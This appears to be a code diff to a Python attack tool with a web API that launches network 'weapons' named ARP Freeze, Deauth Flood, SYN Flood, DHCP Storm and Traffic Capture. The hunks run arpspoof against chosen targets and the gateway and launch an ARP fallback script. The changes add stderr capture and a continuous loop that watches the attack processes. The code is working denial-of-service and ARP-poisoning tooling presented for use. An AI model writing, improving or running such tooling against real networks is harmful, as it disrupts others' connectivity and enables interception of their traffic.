@@ -2886,14 +2886,22 @@ def start_attack_arp_freeze(targets, gateway, iface):
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
             time.sleep(0.1)
             if proc.poll() is not None:
-                raise RuntimeError(f'arpspoof failed for target {t}')
+                stderr = proc.stderr.read().decode(errors='ignore').strip() if proc.stderr else ''
+                error_msg = f'arpspoof failed for target {t}'
+                if stderr:
+                    error_msg += f': {stderr}'
+                raise RuntimeError(error_msg)
             pids.append(proc)
         for t in targets:
             cmd = ['arpspoof', '-i', iface, '-t', gateway, t]
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
             time.sleep(0.1)
             if proc.poll() is not None:
-                raise RuntimeError(f'arpspoof failed for gateway {gateway}')
+                stderr = proc.stderr.read().decode(errors='ignore').strip() if proc.stderr else ''
+                error_msg = f'arpspoof failed for gateway {gateway}'
+                if stderr:
+                    error_msg += f': {stderr}'
+                raise RuntimeError(error_msg)
             pids.append(proc)
         return pids
     else:
@@ -2956,12 +2964,24 @@ def start_attack_arp_freeze(targets, gateway, iface):
         os.close(fd)
         with open(path, 'w') as f:
             f.write(script)
-        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
+        proc = subprocess.Popen(['python3', path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         time.sleep(0.5)
         if proc.poll() is not None:
             stderr = proc.stderr.read().decode(errors='ignore') if proc.stderr else ''
             raise RuntimeError(f'ARP fallback script exited immediately: {stderr}')
-        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
+        # Monitor stderr from the ARP script in background
+        def monitor_arp_fallback(proc_ref, path_ref):
+            try:
+                proc_ref.wait()
+                if proc_ref.returncode != 0:
+                    stderr = proc_ref.stderr.read().decode(errors='ignore') if proc_ref.stderr else ''
+                    add_log('warn', f'ARP fallback script exited with code {proc_ref.returncode}: {stderr}')
+            finally:
+                try:
+                    os.unlink(path_ref)
+                except:
+                    pass
+        threading.Thread(target=monitor_arp_fallback, args=(proc, path), daemon=True).start()
         pids.append(proc)
         return pids
 
@@ -7078,11 +7098,26 @@ def api_start_attack():
         weapon_names = {1:'ARP Freeze',2:'Deauth Flood',3:'SYN Flood',4:'DHCP Storm',5:'Traffic Capture'}
         add_log('success', f'Attack started: {weapon_names[weapon]}')
         def liveness(weapon_id, proc_list):
-            time.sleep(2)
-            if any(p.poll() is not None for p in proc_list):
-                with STATE_LOCK:
-                    STATE['attack_status'][weapon_id] = 'dead'
-                add_log('error', f'Attack {weapon_names[weapon_id]} died unexpectedly')
+            """Continuously monitor attack processes and log failures with stderr."""
+            time.sleep(2)  # Give processes time to initialize
+            while True:
+                time.sleep(1)
+                for i, p in enumerate(proc_list):
+                    if p.poll() is not None:
+                        # Process exited unexpectedly
+                        stderr = ''
+                        if p.stderr:
+                            try:
+                                stderr = p.stderr.read().decode(errors='ignore').strip()
+                            except:
+                                pass
+                        error_msg = f'Process {i} exited with code {p.returncode}'
+                        if stderr:
+                            error_msg += f': {stderr}'
+                        add_log('error', f'Attack {weapon_names[weapon_id]} process failed: {error_msg}')
+                        with STATE_LOCK:
+                            STATE['attack_status'][weapon_id] = 'dead'
+                        return
         threading.Thread(target=liveness, args=(weapon, pids), daemon=True).start()
         return jsonify({'success': True, 'weapon': weapon_names[weapon]})
     except Exception as e:
